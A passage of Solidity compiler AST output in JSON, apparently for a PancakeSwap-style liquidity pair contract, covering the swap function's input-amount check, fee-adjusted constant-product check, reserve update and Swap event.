																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_INPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															}
														],
														"id": 1546,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "13803:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1555,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13803:111:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1556,
												"nodeType": "ExpressionStatement",
												"src": "13803:111:1"
											},
											{
												"id": 1605,
												"nodeType": "Block",
												"src": "13924:502:1",
												"statements": [
													{
														"assignments": [
															1558
														],
														"declarations": [
															{
																"constant": false,
																"id": 1558,
																"name": "balance0Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 1605,
																"src": "14014:21:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1557,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "14014:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1570,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 1566,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14094:2:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1564,
																					"name": "amount0In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1515,
																					"src": "14080:9:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 1565,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2385,
																				"src": "14080:13:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1567,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14080:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 1561,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14069:5:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1559,
																					"name": "balance0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1371,
																					"src": "14056:8:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 1560,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2385,
																				"src": "14056:12:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1562,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14056:19:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1563,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2357,
																		"src": "14056:23:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1568,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14056:42:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 1569,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14038:74:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "14014:98:1"
													},
													{
														"assignments": [
															1572
														],
														"declarations": [
															{
																"constant": false,
																"id": 1572,
																"name": "balance1Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 1605,
																"src": "14126:21:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1571,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "14126:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1584,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 1580,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14206:2:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1578,
																					"name": "amount1In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1531,
																					"src": "14192:9:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 1579,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2385,
																				"src": "14192:13:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1581,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14192:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 1575,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14181:5:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1573,
																					"name": "balance1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1374,
																					"src": "14168:8:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 1574,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2385,
																				"src": "14168:12:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1576,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14168:19:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1577,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2357,
																		"src": "14168:23:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1582,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14168:42:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 1583,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14150:74:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "14126:98:1"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1601,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1588,
																				"name": "balance1Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1572,
																				"src": "14284:16:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"id": 1586,
																				"name": "balance0Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1558,
																				"src": "14263:16:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1587,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2385,
																			"src": "14263:20:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 1589,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14263:38:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">=",
																	"rightExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				},
																				"id": 1599,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 1597,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14360:5:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "**",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 1598,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14369:1:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "14360:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1594,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1355,
																						"src": "14345:9:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 1591,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1353,
																								"src": "14330:9:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"id": 1590,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "14325:4:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_uint256_$",
																								"typeString": "type(uint256)"
																							},
																							"typeName": "uint"
																						},
																						"id": 1592,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "typeConversion",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "14325:15:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1593,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2385,
																					"src": "14325:19:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1595,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "14325:30:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1596,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2385,
																			"src": "14325:34:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 1600,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14325:46:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "14263:108:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a204b",
																	"id": 1602,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "14389:12:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	},
																	"value": "Pancake: K"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	}
																],
																"id": 1585,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2446,
																	2447
																],
																"referencedDeclaration": 2447,
																"src": "14238:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 1603,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14238:177:1",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 1604,
														"nodeType": "ExpressionStatement",
														"src": "14238:177:1"
													}
												]
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1607,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1371,
															"src": "14444:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1608,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1374,
															"src": "14454:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1609,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1353,
															"src": "14464:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1610,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1355,
															"src": "14475:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1606,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 762,
														"src": "14436:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1611,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14436:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1612,
												"nodeType": "ExpressionStatement",
												"src": "14436:49:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1614,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "14505:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1615,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "14505:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1616,
															"name": "amount0In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1515,
															"src": "14517:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1617,
															"name": "amount1In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1531,
															"src": "14528:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1618,
															"name": "amount0Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1330,
															"src": "14539:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1619,
															"name": "amount1Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1332,
															"src": "14551:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1620,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1334,
															"src": "14563:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 1613,
														"name": "Swap",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															609
														],
														"referencedDeclaration": 609,
														"src": "14500:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,uint256,uint256,address)"
														}
													},
													"id": 1621,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14500:66:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1622,
												"nodeType": "EmitStatement",
												"src": "14495:71:1"
											}
										]
									},
									"documentation": null,
									"id": 1624,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1339,
											"modifierName": {
												"argumentTypes": null,
												"id": 1338,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "11848:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "11848:4:1"
										}
									],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1330,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 1624,
												"src": "11743:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1329,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11743:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1332,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 1624,
												"src": "11768:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1331,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11768:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1334,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1624,
												"src": "11793:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1333,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "11793:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1336,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 1624,
												"src": "11813:19:1",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1335,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "11813:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11733:105:1"
									},
									"returnParameters": {
										"id": 1340,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11853:0:1"
									},
									"scope": 1700,
									"src": "11720:2853:1",
									"stateMutability": "nonpayable",
									"superFunction": 2217,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1671,
										"nodeType": "Block",
										"src": "17868:381:1",
										"statements": [
											{
												"assignments": [
													1632
												],
												"declarations": [
													{
														"constant": false,
														"id": 1632,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 1671,
														"src": "17878:15:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1631,
															"name": "address",
